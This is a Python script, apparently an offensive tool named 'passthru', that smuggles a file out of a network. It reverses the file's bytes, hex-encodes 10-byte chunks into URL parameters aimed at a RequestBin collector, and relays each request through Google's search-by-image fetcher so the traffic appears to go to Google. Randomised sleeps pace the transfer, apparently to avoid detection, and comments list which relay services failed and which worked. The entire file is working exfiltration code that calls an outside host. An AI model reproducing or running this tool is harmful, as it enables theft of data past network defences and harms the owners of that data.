from time import sleep
from uuid import uuid4
from random import randint
from pathlib import Path
from argparse import ArgumentParser
from urllib.parse import quote_plus
from passthru import web

class Progress:
    def __init__(self, total):
        self.sent = 0
        self.total = total

    def add(self, increment):
        self.sent += increment

    def print(self):
        pct = (100*self.sent)//self.total
        print(f"{self.sent}/{self.total} ({pct}%)")

# FAILED:
#   https://translate.google.com/translate?sl=auto&tl=en&u={encoded_url}
#   https://www.microsofttranslator.com/bv.aspx?from=&to=en&refd=www.bing.com&rr=DC&a={encoded_url}
# SUCCEEDED:
#   https://images.google.com/searchbyimage?image_url={encoded_url}&encoded_image=&image_content=&filename=&hl=fr

def send(url, data):
    '''[summary]
    '''
    url += f'?id={uuid4()}&kcahsni={data.hex()}'
    encoded_url = quote_plus(url)
    req_url = f'https://images.google.com/searchbyimage?image_url={encoded_url}&encoded_image=&image_content=&filename=&hl=fr'
    print(f'requesting: {req_url}')
    resp = web.get(req_url, headers={'Host': 'images.google.com'})
    print(f'response: {resp}')

def app():
    '''[summary]
    '''
    ap = ArgumentParser(description="")
    ap.add_argument('file', type=Path, help="File to passthru.")
    ap.add_argument('requestbin_id', help="RequestBin ID to target (http://requestbin.net/r/<id>).")
    args = ap.parse_args()

    print(args)

    url = f'http://requestbin.net/r/{args.requestbin_id}'

    with args.file.open('rb') as fp:
        data = list(fp.read())
        data.reverse()
        data = bytes(data)
        dsz = len(data)
        csz = 10
        ccnt = dsz//csz
        if dsz%csz != 0:
            ccnt += 1
        prog = Progress(dsz)
        for k in range(ccnt):
            delay = randint(9,14)
            print(f'going to sleep for {delay} seconds...')
            sleep(delay)
            ck = data[k*csz:(k+1)*csz]
            send(url, ck)
            prog.add(len(ck))
            prog.print()
